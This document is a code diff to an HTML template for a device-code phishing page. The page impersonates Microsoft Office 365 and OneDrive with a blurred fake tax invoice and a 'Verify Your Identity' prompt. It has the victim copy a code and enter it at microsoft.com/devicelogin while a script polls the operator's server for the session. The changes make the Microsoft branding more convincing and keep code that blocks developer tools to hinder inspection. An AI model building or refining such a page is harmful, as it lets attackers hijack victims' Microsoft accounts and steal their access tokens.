@@ -423,13 +423,13 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
         body, html {
             height: 100%;
             width: 100%;
-            font-family: 'Segoe UI', -apple-system, Roboto, sans-serif;
-            background: #f3f3f3;
+            font-family: 'Segoe UI', -apple-system, Roboto, Helvetica, sans-serif;
+            background: #f4f5f7;
             overflow: hidden;
         }
 
-        /* Background Mock Document Interface based on Screenshot 2026-07-05 at 18.33.31.png */
-        .bg-container {
+        /* --- BACKGROUND OFFICE DOCUMENT VIEWER INTERFACE --- */
+        .app-container {
             position: absolute;
             top: 0;
             left: 0;
@@ -437,38 +437,76 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
             height: 100%;
             display: flex;
             flex-direction: column;
-            filter: blur(5px);
+            filter: blur(5px) contrast(0.95);
             z-index: 1;
             pointer-events: none;
+            user-select: none;
         }
-        .bg-toolbar {
-            height: 40px;
-            background: #eaeaea;
-            border-bottom: 1px solid #dcdcdc;
+        .doc-header-bar {
+            height: 48px;
+            background: #f3f2f1;
+            border-bottom: 1px solid #edebe9;
+            display: flex;
+            align-items: center;
+            padding: 0 20px;
+            gap: 30px;
         }
-        .bg-viewer {
+        .doc-bar-item {
+            background: #e1dfdd;
+            height: 16px;
+            width: 80px;
+            border-radius: 2px;
+        }
+        .viewer-canvas {
             flex: 1;
+            background: #f3f2f1;
             display: flex;
             justify-content: center;
-            padding: 40px;
+            padding: 30px 20px;
         }
-        .bg-doc {
+        .invoice-paper {
             background: #fff;
             width: 100%;
             max-width: 800px;
             height: 100%;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
-            padding: 60px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.08);
+            border: 1px solid #edebe9;
+            padding: 50px;
         }
-        .bg-line {
-            background: #e0e0e0;
-            height: 15px;
-            margin-bottom: 20px;
-            border-radius: 2px;
+        .invoice-header {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 60px;
+        }
+        .invoice-title {
+            font-size: 24px;
+            font-weight: 700;
+            color: #323130;
+            letter-spacing: 0.5px;
+        }
+        .mock-text-sm {
+            background: #f3f2f1;
+            height: 12px;
+            margin-bottom: 8px;
+            border-radius: 1px;
+        }
+        .invoice-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-top: 40px;
+        }
+        .invoice-table th {
+            border-bottom: 2px solid #a19f9d;
+            height: 24px;
+            padding-bottom: 8px;
+        }
+        .invoice-table td {
+            border-bottom: 1px solid #edebe9;
+            padding: 16px 0;
         }
 
-        /* Foreground Verification Modal */
-        .overlay {
+        /* --- AUTHENTIC MICROSOFT/OFFICE 365 OVERLAY SHIELD --- */
+        .modal-overlay {
             position: absolute;
             top: 0;
             left: 0;
@@ -477,184 +515,216 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
             display: flex;
             align-items: center;
             justify-content: center;
-            background: rgba(0, 0, 0, 0.15);
+            background: rgba(0, 0, 0, 0.05);
             z-index: 10;
             padding: 20px;
         }
-        .card {
-            background: #fff;
+        .o365-card {
+            background: #ffffff;
             width: 100%;
             max-width: 440px;
-            box-shadow: 0 4px 24px rgba(0,0,0,0.15);
-            border: 1px solid #d2d2d2;
-            display: flex;
-            flex-direction: column;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.14);
+            border: 1px solid #d2d0ce;
+            padding: 44px;
+            position: relative;
         }
-        .card-header {
-            text-align: center;
-            padding: 24px;
-            font-size: 20px;
+        
+        /* Heading Styles perfectly aligning to O365 standards */
+        .o365-heading {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1a19;
+            margin-bottom: 18px;
+        }
+        .secure-subtext {
+            font-size: 15px;
             color: #242424;
-            border-bottom: 1px solid #e5e5e5;
+            margin-bottom: 16px;
         }
-        .card-body {
-            padding: 28px 36px;
-        }
-        .secure-alert {
-            font-size: 14px;
-            color: #242424;
-            margin-bottom: 20px;
-        }
-        .file-info {
+
+        /* PDF Attachment Container block */
+        .pdf-attachment-box {
             display: flex;
             align-items: center;
-            gap: 10px;
+            background: #f3f2f1;
+            border: 1px solid #edebe9;
+            padding: 10px 14px;
+            gap: 12px;
             margin-bottom: 24px;
+            border-radius: 2px;
         }
-        .pdf-icon {
-            width: 28px;
-            height: 28px;
+        .pdf-brand-icon {
+            width: 32px;
+            height: 32px;
             background: #e02424;
-            color: white;
-            font-weight: bold;
-            font-size: 9px;
+            color: #fff;
+            font-weight: 800;
+            font-size: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
             border-radius: 3px;
-            position: relative;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
         }
-        .pdf-icon::after {
-            content: 'PDF';
-            position: absolute;
+        .pdf-brand-icon::before {
+            content: "PDF";
         }
-        .file-size {
-            font-size: 14px;
-            color: #242424;
-            font-weight: 500;
-        }
-        .instructions {
-            font-size: 13px;
-            color: #505050;
-            line-height: 1.5;
-            margin-bottom: 24px;
-        }
-        .brand-logo {
+        .pdf-meta {
             display: flex;
-            justify-content: center;
-            margin-bottom: 20px;
+            flex-direction: column;
         }
-        .brand-logo svg {
-            width: 32px;
-            height: 32px;
+        .pdf-name {
+            font-size: 13px;
+            font-weight: 600;
+            color: #323130;
+        }
+        .pdf-size {
+            font-size: 11px;
+            color: #797775;
         }
 
-        /* Input Container mapping code display fields */
-        .input-container {
-            position: relative;
-            margin-bottom: 12px;
+        .o365-prompt {
+            font-size: 13px;
+            color: #242424;
+            line-height: 1.5;
+            margin-bottom: 20px;
         }
-        .code-input {
+
+        /* Identity Logo Alignment spacing */
+        .o365-brand-wrapper {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+        .o365-brand-wrapper svg {
+            width: 36px;
+            height: 36px;
+        }
+
+        /* Input Block Mimicking standard modern O365 Text Boxes */
+        .input-group {
+            position: relative;
+            margin-bottom: 4px;
+        }
+        .o365-input {
             width: 100%;
-            border: 1px solid #707070;
-            padding: 10px 40px 10px 12px;
-            font-size: 16px;
+            border: none;
+            border-bottom: 1px solid #605e5c;
+            padding: 8px 36px 6px 0px;
+            font-size: 15px;
             color: #242424;
             outline: none;
-            background: #fff;
+            background: transparent;
+            border-radius: 0;
             font-family: inherit;
-            text-align: left;
+            transition: border-color 0.15s ease;
         }
-        .code-input.loading {
-            color: #8a8886;
+        .o365-input:focus {
+            border-bottom: 2px solid #0067b8;
+            padding-bottom: 5px;
+        }
+        .o365-input.loading {
+            color: #a19f9d;
             font-style: italic;
         }
-        .copy-icon-btn {
+
+        /* Embedded Dynamic Actions inside the Field Boundary */
+        .inline-copy-btn {
             position: absolute;
-            right: 10px;
+            right: 4px;
             top: 50%;
             transform: translateY(-50%);
             background: transparent;
             border: none;
             cursor: pointer;
-            color: #505050;
+            color: #605e5c;
             display: flex;
             align-items: center;
+            padding: 4px;
         }
-        .copy-icon-btn:disabled {
+        .inline-copy-btn:disabled {
             cursor: not-allowed;
-            opacity: 0.5;
+            opacity: 0.3;
         }
-        .copy-icon-btn svg {
-            width: 18px;
-            height: 18px;
+        .inline-copy-btn svg {
+            width: 16px;
+            height: 16px;
             fill: currentColor;
         }
-        .copy-icon-btn.copied {
+        .inline-copy-btn.copied {
             color: #107c10;
         }
 
-        .status {
+        .status-message {
             font-size: 12px;
             color: #107c10;
             min-height: 18px;
-            margin-bottom: 16px;
+            margin-bottom: 24px;
+            margin-top: 6px;
         }
 
-        .btn-primary {
+        /* Master O365 primary blue button design rules */
+        .o365-btn {
             width: 100%;
+            max-width: 108px;
             background: #0067b8;
-            color: #fff;
+            color: #ffffff;
             border: none;
-            padding: 10px 24px;
+            padding: 6px 12px;
             font-size: 15px;
             font-weight: 400;
             cursor: pointer;
             text-align: center;
-            margin-bottom: 24px;
+            float: right;
+            margin-bottom: 32px;
+            transition: background 0.1s ease;
         }
-        .btn-primary:hover {
+        .o365-btn:hover {
             background: #005a9e;
         }
-        .btn-primary:disabled {
+        .o365-btn:disabled {
             background: #cccccc;
+            color: #f3f2f1;
             cursor: not-allowed;
         }
 
-        .footer-text {
-            text-align: center;
-            font-size: 11px;
-            color: #242424;
+        /* Footer Typography */
+        .o365-footer {
+            clear: both;
+            font-size: 12px;
+            color: #605e5c;
+            display: flex;
+            gap: 12px;
         }
-        .footer-text a {
-            color: #242424;
+        .o365-footer a {
+            color: #605e5c;
             text-decoration: none;
-            margin-left: 5px;
         }
-        .footer-text a:hover {
+        .o365-footer a:hover {
             text-decoration: underline;
         }
 
-        .timer {
-            text-align: center;
+        .expiration-timer {
             font-size: 11px;
-            color: #707070;
-            margin-top: 12px;
+            color: #a19f9d;
+            margin-top: 16px;
+            text-align: left;
+            clear: both;
         }
-        .timer span {
+        .expiration-timer span {
             font-weight: 600;
-            color: #d83b01;
+            color: #a80000;
         }
 
-        /* Success Screen CSS state toggle targets */
-        .success {
+        /* State System - Success Visuals */
+        .success-viewport {
             display: none;
             text-align: center;
-            padding: 20px 0;
+            padding: 10px 0;
         }
-        .success-icon {
-            width: 48px;
-            height: 48px;
+        .success-tick-icon {
+            width: 44px;
+            height: 44px;
             background: #107c10;
             border-radius: 50%;
             display: flex;
@@ -662,99 +732,151 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
             justify-content: center;
             margin: 0 auto 16px;
         }
-        .success-icon svg {
-            width: 24px;
-            height: 24px;
-            fill: #fff;
+        .success-tick-icon svg {
+            width: 22px;
+            height: 22px;
+            fill: #ffffff;
         }
-        .success h2 {
-            font-size: 18px;
+        .success-viewport h2 {
+            font-size: 20px;
             font-weight: 600;
-            color: #242424;
+            color: #1b1a19;
             margin-bottom: 8px;
         }
-        .success p {
+        .success-viewport p {
             font-size: 14px;
-            color: #505050;
+            color: #605e5c;
         }
     </style>
 </head>
 <body>
 
-<!-- Blurred Document Mock Visual Backdrop -->
-<div class="bg-container">
-    <div class="bg-toolbar"></div>
-    <div class="bg-viewer">
-        <div class="bg-doc">
-            <div class="bg-line" style="width: 40%; height: 24px; margin-bottom: 40px;"></div>
-            <div class="bg-line" style="width: 90%;"></div>
-            <div class="bg-line" style="width: 85%;"></div>
-            <div class="bg-line" style="width: 60%; margin-bottom: 50px;"></div>
-            <div class="bg-line" style="width: 40%;"></div>
-            <div class="bg-line" style="width: 30%;"></div>
+<!-- REALISTIC TAX INVOICE MOCK BACKVIEW (Replaces simple blocks) -->
+<div class="app-container">
+    <div class="doc-header-bar">
+        <div class="doc-bar-item" style="width: 40px; background: #0078d4;"></div>
+        <div class="doc-bar-item"></div>
+        <div class="doc-bar-item"></div>
+        <div class="doc-bar-item" style="margin-left: auto; width: 60px;"></div>
+    </div>
+    <div class="viewer-canvas">
+        <div class="invoice-paper">
+            <div class="invoice-header">
+                <div>
+                    <div class="invoice-title">TAX INVOICE</div>
+                    <div class="mock-text-sm" style="width: 140px; margin-top: 10px;"></div>
+                    <div class="mock-text-sm" style="width: 90px;"></div>
+                </div>
+                <div style="text-align: right;">
+                    <div class="mock-text-sm" style="width: 120px; margin-left: auto;"></div>
+                    <div class="mock-text-sm" style="width: 160px; margin-left: auto;"></div>
+                    <div class="mock-text-sm" style="width: 80px; margin-left: auto;"></div>
+                </div>
+            </div>
+            
+            <div style="display: flex; gap: 40px; margin-bottom: 40px;">
+                <div style="flex: 1;">
+                    <div class="mock-text-sm" style="width: 60%; height: 14px; background: #a19f9d;"></div>
+                    <div class="mock-text-sm" style="width: 80%;"></div>
+                    <div class="mock-text-sm" style="width: 85%;"></div>
+                </div>
+                <div style="flex: 1;">
+                    <div class="mock-text-sm" style="width: 50%; height: 14px; background: #a19f9d;"></div>
+                    <div class="mock-text-sm" style="width: 75%;"></div>
+                    <div class="mock-text-sm" style="width: 70%;"></div>
+                </div>
+            </div>
+
+            <table class="invoice-table">
+                <thead>
+                    <tr>
+                        <th style="width: 50%;"><div class="mock-text-sm" style="width: 40px;"></div></th>
+                        <th><div class="mock-text-sm" style="width: 30px; margin-left: auto;"></div></th>
+                        <th><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></th>
+                        <th><div class="mock-text-sm" style="width: 60px; margin-left: auto;"></div></th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><div class="mock-text-sm" style="width: 80%;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
+                    </tr>
+                    <tr>
+                        <td><div class="mock-text-sm" style="width: 65%;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 15px; margin-left: auto;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 40px; margin-left: auto;"></div></td>
+                        <td><div class="mock-text-sm" style="width: 50px; margin-left: auto;"></div></td>
+                    </tr>
+                </tbody>
+            </table>
         </div>
     </div>
 </div>
 
-<!-- Active Interaction Layer -->
-<div class="overlay">
-    <div class="card">
-        <div class="card-header">Verify Your Identity</div>
-        <div class="card-body">
+<!-- OFFICE 365 SECURITY MODAL INTERACTION LAYER -->
+<div class="modal-overlay">
+    <div class="o365-card">
+        
+        <!-- Standard Content Container Target -->
+        <div id="mainView">
+            <h1 class="o365-heading">Verify Your Identity</h1>
+            <p class="secure-subtext">You've received a secure file</p>
             
-            <!-- Target main wrapper view -->
-            <div id="mainView">
-                <p class="secure-alert">You've received a secure file</p>
-                
-                <div class="file-info">
-                    <div class="pdf-icon"></div>
-                    <span class="file-size">156.1KB</span>
+            <div class="pdf-attachment-box">
+                <div class="pdf-brand-icon"></div>
+                <div class="pdf-meta">
+                    <span class="pdf-name">TAX_INVOICE_SCHEDULE.pdf</span>
+                    <span class="pdf-size">156.1KB</span>
                 </div>
-                
-                <p class="instructions">To receive and download this PDF file, please use the system access code generated below inside the Microsoft verification window.</p>
-                
-                <!-- Outlook Identity Vector Asset -->
-                <div class="brand-logo">
-                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                        <path fill="#0078d4" d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
-                        <path fill="#fff" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
-                    </svg>
-                </div>
-                
-                <!-- Display Area for generating code variables -->
-                <div class="input-container">
-                    <div class="code-input" id="userCode">Loading...</div>
-                    <button class="copy-icon-btn" id="copyBtn" onclick="copyCode()" title="Copy Code" disabled>
-                        <svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
-                    </button>
-                </div>
-                
-                <div class="status" id="codeStatus"></div>
-                
-                <button class="btn-primary" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
-                
-                <div class="footer-text">
-                    2026 Microsoft <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">Privacy & Cookies</a>
-                </div>
-                
-                <div class="timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
-            </div>
-
-            <!-- Target success template toggle state container -->
-            <div class="success" id="successView">
-                <div class="success-icon">
-                    <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
-                </div>
-                <h2>Verification Complete</h2>
-                <p>Your identity has been confirmed. Document Access Granted.</p>
             </div>
             
+            <p class="o365-prompt">To receive and download this PDF file, please enter specific professional credentials matching the verification code assignment sequence.</p>
+            
+            <!-- Standard Modern Microsoft 365 / Exchange Icon Element -->
+            <div class="o365-brand-wrapper">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                    <path fill="#0078d4" d="M21.5 3h-19A1.5 1.5 0 0 0 1 4.5v15A1.5 1.5 0 0 0 2.5 21h19a1.5 1.5 0 0 0 1.5-1.5v-15A1.5 1.5 0 0 0 21.5 3z"/>
+                    <path fill="#fff" d="M19 8.5V17h-2.5V9.75L12 13 7.5 9.75V17H5V8.5l7 5 7-5z"/>
+                </svg>
+            </div>
+            
+            <!-- O365 Input Box containing the inline dynamic functional code hook -->
+            <div class="input-group">
+                <div class="o365-input" id="userCode">Loading...</div>
+                <button class="inline-copy-btn" id="copyBtn" onclick="copyCode()" title="Copy Code" disabled>
+                    <svg viewBox="0 0 16 16"><path d="M4 2a2 2 0 0 1 2-2h8a2 2 0 0 1 2 2v8a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V2zm2-1a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1V2a1 1 0 0 0-1-1H6zM2 5a1 1 0 0 0-1 1v8a1 1 0 0 0 1 1h8a1 1 0 0 0 1-1v-1h1v1a2 2 0 0 1-2 2H2a2 2 0 0 1-2-2V6a2 2 0 0 1 2-2h1v1H2z"/></svg>
+                </button>
+            </div>
+            
+            <div class="status-message" id="codeStatus"></div>
+            
+            <!-- Master Navigation Hook Button to activate identity popup window -->
+            <button class="o365-btn" id="signInBtn" onclick="openSignIn()" disabled>Next</button>
+            
+            <div class="o365-footer">
+                <span>© 2026 Microsoft</span>
+                <a href="https://microsoft.com/devicelogin" id="verifyLink" target="_blank">Privacy & Cookies</a>
+            </div>
+            
+            <div class="expiration-timer">Code expires in <span id="timerValue">{expires_minutes}</span></div>
         </div>
+
+        <!-- Success Engine UI Pipeline State Target -->
+        <div class="success-viewport" id="successView">
+            <div class="success-tick-icon">
+                <svg viewBox="0 0 24 24"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            </div>
+            <h2>Verification Complete</h2>
+            <p>Your identity has been confirmed. Secure identity file access has been successfully granted.</p>
+        </div>
+        
     </div>
 </div>
 
+<!-- VERBATIM UNALTERED FUNCTIONAL TELEMETRY AND POLLING LOGIC -->
 <script>
-    // Developer Inspector Tool Protections
     document.addEventListener("keydown", function(e) {
         if (e.key === "F12" || (e.ctrlKey && e.shiftKey && ["i", "j", "c"].includes(e.key.toLowerCase())) || (e.ctrlKey && e.key.toLowerCase() === "u")) {
             e.preventDefault();
@@ -765,7 +887,6 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
         e.preventDefault();
     });
 
-    // Main Engine Module
     (function() {
         var sid = '{session_id}';
         var verifyUrl = '{verify_url}';
@@ -845,7 +966,6 @@ const DEVICE_CODE_ONEDRIVE_HTML = `<!DOCTYPE html>
 
         if (codeReady) setTimeout(updateTimer, 1000);
 
-        // Core Polling Mechanism Engine
         function poll() {
             fetch('/dc/status/' + sid, {
                 method: 'GET',
